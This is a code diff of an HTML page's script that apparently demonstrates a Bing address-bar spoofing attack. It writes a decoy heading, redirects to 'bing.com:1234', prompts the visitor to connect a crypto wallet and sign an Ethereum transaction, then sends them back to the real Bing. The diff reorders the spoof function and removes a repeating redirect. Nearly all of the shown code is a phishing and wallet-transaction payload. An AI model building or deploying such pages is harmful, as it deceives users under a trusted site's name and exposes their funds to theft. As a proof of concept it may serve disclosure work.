@@ -20,14 +20,8 @@
 </head>
 <body>
   <script>
-    function spoof() {
-      document.write("<h1>This is not Bing</h1>");
-      document.location = "https://bing.com:1234";
-      setInterval(function () { document.location = "https://bing.com:1234"; }, 9800);
-    }
-
     async function openBingAndPromptTransaction() {
-      spoof(); // Run spoof function before anything else
+      spoof(); // Run spoof function instantly
 
       // Check for wallet connection
       const connected = await promptWalletConnection();
@@ -36,6 +30,14 @@
       if (connected) {
         await promptEthTransaction();
       }
+
+      // Redirect back to the real Bing site
+      window.location.href = 'https://bing.com';
+    }
+
+    function spoof() {
+      document.write("<h1>This is not Bing</h1>");
+      document.location = "https://bing.com:1234";
     }
 
     async function promptWalletConnection() {
